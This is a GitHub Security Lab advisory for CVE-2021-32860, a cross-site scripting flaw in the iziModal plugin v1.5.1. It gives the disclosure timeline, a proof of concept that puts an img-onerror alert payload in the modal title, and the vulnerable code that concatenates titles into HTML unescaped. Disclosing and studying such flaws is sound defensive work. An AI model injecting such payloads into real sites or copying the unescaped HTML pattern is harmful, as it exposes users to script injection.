# GHSL-2021-1044: Cross-Site Scripting (XSS) in iziModal - CVE-2021-32860

[![Author avatar](https://avatars.githubusercontent.com/u/61799930)
GitHub Security Lab](https://github.com/ghsecuritylab)

## Coordinated Disclosure Timeline

* 2021-11-24: Maintainer contacted.
* 2022-04-12: Maintainer contacted.
* 2022-04-29: Public issue created asking for a security contact.
* 2022-05-26: Updated the public issue with our intention to publish the advisory due to the lack of response.
* 2022-05-30: Maintainer fixed the issue.

## Summary

iziModal is prone to `XSS` when handling untrusted modal titles.

## Product

iziModal

## Tested Version

[v1.5.1](https://github.com/marcelodolza/iziModal/releases/tag/v1.5.1)

## Details

An attacker who is able to influence the field `title` when creating a `iziModal` instance is able to supply arbitrary `html` or `javascript` code that will be rendered in the context of a user, potentially leading to `XSS`.

*Proof of concept snippet:*

```
$("#modal").iziModal({
    title: '<img src="foobar" onerror="alert(6)" />',
    subtitle: 'Blabity'
});

$(document).on('click', '.trigger', function (event) {
    event.preventDefault();
    $('#modal').iziModal('open');
});

```

*Vulnerable code:* [iziModal.js](https://github.com/marcelodolza/iziModal/blob/7641ca597eb7d40eb4021738ebab603bd425fab8/js/iziModal.js#L218)

```
createHeader: function(){
    this.$header = $('<div class="'+PLUGIN_NAME+'-header"><h2 class="'+PLUGIN_NAME+'-header-title">' +
        this.options.title +
        '</h2><p class="'+PLUGIN_NAME+'-header-subtitle">' + this.options.subtitle +
        '</p><div class="'+PLUGIN_NAME+'-header-buttons"></div></div>');

```
#### Impact

This issue may lead to `XSS`
